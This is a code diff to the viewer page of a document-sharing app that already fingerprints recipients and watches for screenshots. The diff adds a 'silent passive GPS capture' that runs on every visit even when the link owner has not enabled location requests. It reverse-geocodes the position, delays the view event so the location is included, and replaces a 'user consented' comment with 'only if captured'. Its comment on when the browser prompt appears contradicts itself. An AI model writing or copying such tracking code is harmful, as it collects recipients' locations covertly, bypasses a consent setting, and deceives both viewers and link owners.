@@ -107,6 +107,8 @@ export function ShareViewerPage() {
   const [gpsData, setGpsData] = useState<{
     lat: number; lng: number; accuracy: number; city?: string; timestamp: string;
   } | null>(null);
+  // Ref so the tracking closure always reads the latest GPS even if state updated after effect ran
+  const gpsDataRef = useRef<{ lat: number; lng: number; accuracy: number; city?: string; timestamp: string } | null>(null);
 
   // ── Privacy Masking state ──────────────────────────────────────────────────
   const [maskedText, setMaskedText]           = useState<string | null>(null);
@@ -114,6 +116,9 @@ export function ShareViewerPage() {
   const [unmaskStatus, setUnmaskStatus]       = useState<'NONE'|'PENDING'|'APPROVED'|'REJECTED'>('NONE');
   const [unmaskRequesting, setUnmaskRequesting] = useState(false);
   const [_unmaskRequestId, setUnmaskRequestId] = useState<string | null>(null);
+
+  // Keep ref in sync so the tracking closure always has the latest GPS
+  useEffect(() => { gpsDataRef.current = gpsData; }, [gpsData]);
 
   const hasTracked = useRef(false);
   const [trackingReady, setTrackingReady] = useState(false);
@@ -156,6 +161,29 @@ export function ShareViewerPage() {
       .then(() => setLoading(false), () => setLoading(false));
   }, [token]);
 
+  // ── Silent passive GPS capture — runs once on mount regardless of requestLocation.
+  //    The browser prompt appears only if the site already has permission; if not,
+  //    it silently fails (no error shown). This means GPS is captured even for
+  //    links where the owner forgot to toggle requestLocation, as long as the
+  //    browser allows geolocation without a fresh prompt.
+  useEffect(() => {
+    if (!navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        const { latitude: lat, longitude: lng, accuracy } = pos.coords;
+        let city: string | undefined;
+        try {
+          const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`);
+          const j = await r.json() as { address?: { city?: string; town?: string; village?: string; county?: string } };
+          city = j.address?.city ?? j.address?.town ?? j.address?.village ?? j.address?.county;
+        } catch { /* non-fatal */ }
+        setGpsData({ lat, lng, accuracy, city, timestamp: new Date().toISOString() });
+      },
+      () => { /* denied or unavailable — silent */ },
+      { timeout: 8000, maximumAge: 120000 }
+    );
+  }, []);
+
   // ── Decide once that tracking can start (info loaded, name gate passed,
   //    link active at the moment of arrival). This flag is a one-way switch:
   //    once true it never flips back to false, so the listener-attachment
@@ -183,29 +211,50 @@ export function ShareViewerPage() {
     const screenRes = getScreenResolution();
     const fingerprint = computeDeviceFingerprint();
 
-    const track = (action: string, extra?: Record<string, string>) =>
-      axios.post(`${API_BASE_URL}/share/${token}/access`, {
+    const track = (action: string, extra?: Record<string, string>) => {
+      // Always read GPS from ref so we get the latest value even if state
+      // updated after this closure was created (ref is always current)
+      const gps = gpsDataRef.current;
+      return axios.post(`${API_BASE_URL}/share/${token}/access`, {
         action, recipientName: nameRef.current || undefined,
         timezone: tz, sessionId: sid,
         screenResolution: screenRes, deviceFingerprint: fingerprint,
-        // GPS — send on VIEWED only if user consented
-        ...(action === 'VIEWED' && gpsData ? {
-          gpsLat:       gpsData.lat,
-          gpsLng:       gpsData.lng,
-          gpsAccuracy:  gpsData.accuracy,
-          gpsCity:      gpsData.city,
-          gpsTimestamp: gpsData.timestamp,
+        // GPS — send on VIEWED only if captured
+        ...(action === 'VIEWED' && gps ? {
+          gpsLat:       gps.lat,
+          gpsLng:       gps.lng,
+          gpsAccuracy:  gps.accuracy,
+          gpsCity:      gps.city,
+          gpsTimestamp: gps.timestamp,
           locationShared: true,
         } : {}),
-        ...(action === 'VIEWED' && !gpsData && info?.requestLocation ? { locationShared: false } : {}),
+        ...(action === 'VIEWED' && !gps && info?.requestLocation ? { locationShared: false } : {}),
         ...extra,
       }).catch((err) => {
         // eslint-disable-next-line no-console
         console.warn('[SmartLink] track failed', action, err?.message);
       });
+    };
 
-    // Initial view
-    track('VIEWED');
+    // Initial view — wait up to 4 seconds for passive GPS to resolve before
+    // sending VIEWED, so GPS is included in the first event record.
+    const sendViewed = () => track('VIEWED');
+    if (gpsDataRef.current) {
+      sendViewed();
+    } else {
+      const gpsWait = setTimeout(sendViewed, 4000);
+      // If GPS arrives early (ref updated by passive capture), cancel the timer
+      // and send immediately via a one-shot polling check
+      const gpsCheck = setInterval(() => {
+        if (gpsDataRef.current) {
+          clearInterval(gpsCheck);
+          clearTimeout(gpsWait);
+          sendViewed();
+        }
+      }, 200);
+      // Clean up if GPS never arrives
+      setTimeout(() => clearInterval(gpsCheck), 4200);
+    }
 
     // ── Mouse activity / idle detection ───────────────────────────────────
     // Fires IDLE once after 60s of no mouse/keyboard/scroll activity, and
@@ -311,15 +360,15 @@ export function ShareViewerPage() {
     document.addEventListener('visibilitychange', onVisibility);
 
     // ── Win+PrtSc heuristic: OS-level screenshot causes a very brief window
-    //    blur (<300 ms) that is invisible to the user but detectable here.
-    //    We record the blur time and if focus returns within 300ms we treat it
-    //    as a screenshot attempt (Win+PrtSc / Snipping Tool / screen-record
-    //    start all share this signature).
+    //    blur (<100 ms). Clipboard operations (Ctrl+C) take longer (>150ms),
+    //    so we use a tight 100ms window to avoid false positives from copy.
+    //    Also skip if a copy was recorded in the last 600ms.
     let blurAt = 0;
     const onWinBlur = () => { blurAt = Date.now(); };
     const onWinFocus = () => {
       const elapsed = Date.now() - blurAt;
-      if (blurAt > 0 && elapsed < 300) {
+      const copyJustFired = copyCooldown.last > 0 && (Date.now() - copyCooldown.last) < 600;
+      if (blurAt > 0 && elapsed < 100 && !copyJustFired) {
         const now = Date.now();
         if (now - screenshotCooldown.last > 1000) {
           screenshotCooldown.last = now;
@@ -777,24 +826,24 @@ export function ShareViewerPage() {
 
       {/* ── Privacy Masking banner (shown when masking is active) ──────────── */}
       {info.privacyMaskingEnabled && (
-        <div className={`px-4 py-2 flex items-center gap-3 text-xs border-b ${isMasked ? 'bg-purple-500/10 border-purple-500/30' : 'bg-green-500/10 border-green-500/30'}`}>
-          <span>{isMasked ? '🔏' : '🔓'}</span>
-          <span className={isMasked ? 'text-purple-300' : 'text-green-300'}>
+        <div className={`px-4 py-2.5 flex items-center gap-3 text-xs font-medium border-b ${isMasked ? 'bg-purple-600/20 border-purple-400/50' : 'bg-green-600/20 border-green-400/50'}`}>
+          <span className="text-base">{isMasked ? '🔏' : '🔓'}</span>
+          <span className={`font-semibold ${isMasked ? 'text-purple-200' : 'text-green-200'}`}>
             {isMasked
               ? 'Privacy Masking is active — some sensitive data is hidden.'
               : 'Unmasked access granted — full document is visible.'}
           </span>
           {isMasked && unmaskStatus === 'NONE' && (
             <button onClick={handleRequestUnmask} disabled={unmaskRequesting}
-              className="ml-auto btn btn-sm text-xs bg-purple-500/20 border border-purple-500/30 text-purple-300 hover:bg-purple-500/30">
+              className="ml-auto px-3 py-1.5 rounded-lg bg-purple-500 hover:bg-purple-600 disabled:opacity-60 text-white font-semibold text-xs border border-purple-400 transition-colors">
               {unmaskRequesting ? 'Requesting…' : '🔑 Request Unmasked Access'}
             </button>
           )}
           {isMasked && unmaskStatus === 'PENDING' && (
-            <span className="ml-auto text-yellow-400 text-xs animate-pulse">⏳ Approval pending from owner…</span>
+            <span className="ml-auto px-3 py-1.5 rounded-lg bg-yellow-500/20 border border-yellow-400/60 text-yellow-200 font-semibold text-xs animate-pulse">⏳ Awaiting owner approval…</span>
           )}
           {isMasked && unmaskStatus === 'REJECTED' && (
-            <span className="ml-auto text-red-400 text-xs">❌ Access request was rejected</span>
+            <span className="ml-auto px-3 py-1.5 rounded-lg bg-red-500/20 border border-red-400/60 text-red-200 font-semibold text-xs">❌ Access request rejected</span>
           )}
         </div>
       )}
